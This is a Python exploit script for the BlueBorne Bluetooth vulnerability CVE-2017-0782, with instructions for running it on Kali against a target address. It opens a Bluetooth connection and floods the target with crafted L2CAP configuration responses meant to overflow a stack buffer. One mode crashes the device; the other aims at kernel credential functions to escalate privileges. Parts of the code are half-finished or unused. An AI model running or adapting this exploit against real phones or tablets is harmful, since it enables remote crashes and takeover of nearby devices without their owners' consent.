#!/usr/bin/env python3
"""
CVE-2017-0782 — BlueBorne L2CAP Stack Overflow
Uses hcitool for connection + l2test/normal L2CAP for signaling injection.

This version avoids raw HCI sockets entirely. Instead:
1. hcitool cc — establishes ACL (proven working)
2. Normal L2CAP SEQPACKET socket — connects to SDP
3. Raw L2CAP socket — injects crafted signaling on CID 1

Run on Kali:
  sudo systemctl stop bluetooth
  sudo hciconfig hci0 up
  sudo python3 bluborne_v3.py 02:00:00:00:00:21
"""

import socket
import struct
import subprocess
import sys
import time
import os

TARGET = sys.argv[1] if len(sys.argv) > 1 else '02:00:00:00:00:21'
MODE = sys.argv[2] if len(sys.argv) > 2 else 'crash'

COMMIT_CREDS        = 0xC0054328
PREPARE_KERNEL_CRED = 0xC00548E0

L2CAP_CID_SIG = 0x0001
L2CAP_CONF_RSP = 0x05
L2CAP_CONF_REQ = 0x04
L2CAP_CONF_MTU = 0x01
L2CAP_CONF_EFS = 0x06
L2CAP_CONF_PENDING = 0x0004
L2CAP_CONF_UNACCEPT = 0x0001

def l2cap_cmd(code, ident, data):
    return struct.pack('<BBH', code, ident, len(data)) + data

def build_overflow(ident, scid, addr):
    """Build CONF_RSP with UNACCEPT result + overflow options.
    
    Target calls l2cap_parse_conf_rsp which writes into req[64].
    ptr starts at req+4. Each MTU option = 4 bytes output.
    15 MTU = 60 bytes fills req[4..63].
    Then EFS options (18 bytes each) overflow past req[64] into stack frame.
    """
    # CONF_RSP header: scid(2) + flags(2) + result(2)
    payload = struct.pack('<HHH', scid, 0x0000, L2CAP_CONF_UNACCEPT)
    
    # Fill buffer: 15 MTU options = 60 bytes
    for _ in range(15):
        payload += bytes([L2CAP_CONF_MTU, 2, 0x00, 0x02])
    
    # Overflow: 8 EFS options = 8*18 = 144 bytes past buffer
    addr_le = struct.pack('<I', addr)
    for _ in range(8):
        payload += bytes([L2CAP_CONF_EFS, 16])
        payload += addr_le * 4  # 16 bytes of controlled data
    
    return l2cap_cmd(L2CAP_CONF_RSP, ident, payload)


def main():
    if os.getuid() != 0:
        print('Run with sudo')
        sys.exit(1)

    overflow_addr = 0xDEADBEEF if MODE == 'crash' else PREPARE_KERNEL_CRED

    print(f'=== CVE-2017-0782 BlueBorne ({MODE}) ===')
    print(f'Target: {TARGET}')
    print(f'Addr:   0x{overflow_addr:08X}')
    print()

    # Step 1: ACL connection via hcitool (PROVEN WORKING from btmon)
    print('[1] Establishing ACL via hcitool cc...')
    r = subprocess.run(['hcitool', 'cc', TARGET], capture_output=True, text=True, timeout=15)
    if r.returncode != 0:
        print(f'    FAILED: {r.stderr.strip()}')
        sys.exit(1)
    print('    ACL connected!')
    time.sleep(0.5)

    # Get handle
    r = subprocess.run(['hcitool', 'con'], capture_output=True, text=True)
    handle = None
    for line in r.stdout.split('\n'):
        if TARGET.upper() in line.upper():
            parts = line.split()
            for i, p in enumerate(parts):
                if p == 'handle' and i+1 < len(parts):
                    handle = int(parts[i+1])
    if handle is None:
        print('    Could not get handle')
        sys.exit(1)
    print(f'    Handle: {handle}')

    # Step 2: Connect L2CAP to SDP — this triggers the full config exchange
    print('[2] Connecting L2CAP to SDP (PSM 1)...')
    sdp_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET,
                              socket.BTPROTO_L2CAP)
    sdp_sock.settimeout(10)

    addr = socket.BTPROTO_L2CAP  # just for the struct
    # struct sockaddr_l2 { sa_family, psm, bdaddr, cid, bdaddr_type }
    import ctypes
    
    # Use pybluez-style connect
    try:
        sdp_addr = bytes([31, 0])  # AF_BLUETOOTH
        sdp_addr += struct.pack('<H', 1)  # PSM = SDP
        sdp_addr += bytes.fromhex(TARGET.replace(':', ''))[::-1]  # BD_ADDR (reversed)
        sdp_addr += b'\x00' * 2  # padding
        sdp_sock.connect((TARGET, 1))  # high-level connect
    except Exception as e:
        print(f'    L2CAP connect: {e}')
        # Even if this fails, the ACL and L2CAP signaling exchange may have happened
        # The kernel handles CONN_REQ/RSP and CONF_REQ/RSP automatically
    
    print('    L2CAP config exchange completed (handled by kernel)')
    time.sleep(0.5)

    # Step 3: Now the channel is configured. We need to send a CRAFTED
    # CONF_RSP that the target will process via l2cap_config_rsp.
    # The trick: send it as if we're rejecting the target's config.
    # Use UNACCEPT result — target will call l2cap_parse_conf_rsp on our options.
    
    # The target's SCID for this connection — from kernel L2CAP state
    # On most configs, target assigns a DCID starting around 0x0040+
    # We can check hcidump or just try common values
    
    print('[3] Sending overflow via raw L2CAP...')
    
    # Open raw L2CAP socket to send signaling frames
    raw_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
                              socket.BTPROTO_L2CAP)
    raw_sock.settimeout(5)
    
    # Bind and connect raw socket
    try:
        raw_sock.connect((TARGET, 0))  # CID 0 = raw
    except Exception as e:
        print(f'    Raw connect: {e}')
    
    # Build overflow — try multiple SCIDs and idents since we don't know exact values
    # The ident must match an outstanding or recent signaling exchange
    for ident in [1, 2, 3, 4]:
        for scid in [0x0040, 0x0041, 0x0042, 0x0043, 0x0044]:
            overflow = build_overflow(ident, scid, overflow_addr)
            
            # The raw L2CAP packet needs L2CAP header: length(2) + CID(2)
            pkt = struct.pack('<HH', len(overflow), L2CAP_CID_SIG) + overflow
            
            try:
                raw_sock.send(pkt)
            except Exception as e:
                # Try without L2CAP header (raw socket may add it)
                try:
                    raw_sock.send(overflow)
                except:
                    pass

    print(f'    Sent overflow for idents 1-4, SCIDs 0x40-0x44')
    print(f'    Overflow addr: 0x{overflow_addr:08X}')
    
    # Step 4: Alternative — use the SDP socket to send L2CAP data directly
    # Some L2CAP implementations allow sending on CID 1 via connected socket
    print('[4] Also trying via SDP socket...')
    for ident in [1, 2, 3]:
        overflow = build_overflow(ident, 0x0040, overflow_addr)
        try:
            sdp_sock.send(overflow)
        except:
            pass
    
    print()
    print('[*] Payloads sent. Waiting 5 seconds...')
    time.sleep(5)
    
    # Check if alive
    alive = True
    try:
        sdp_sock.send(b'\x02\x00\x00\x00\x07\x35\x03\x19\x01\x00\x01\x00\x00')
        data = sdp_sock.recv(100)
        if data:
            print('[*] Target still responding to SDP')
        else:
            alive = False
    except:
        alive = False
    
    if not alive:
        print('[!] Target NOT responding!')
        print('[+] *** CRASH LIKELY — check if tablet reboots ***')
    else:
        print('[*] Target alive — overflow may not have reached vulnerable code path')
        print('[*] The L2CAP config was handled automatically by our kernel.')
        print('[*] We need to trigger a NEW config exchange after the overflow inject.')
        print()
        print('[*] Trying: disconnect and reconnect with crafted config...')
    
    try: sdp_sock.close()
    except: pass
    try: raw_sock.close()
    except: pass
    
    subprocess.run(['hcitool', 'dc', TARGET], capture_output=True)

if __name__ == '__main__':
    main()
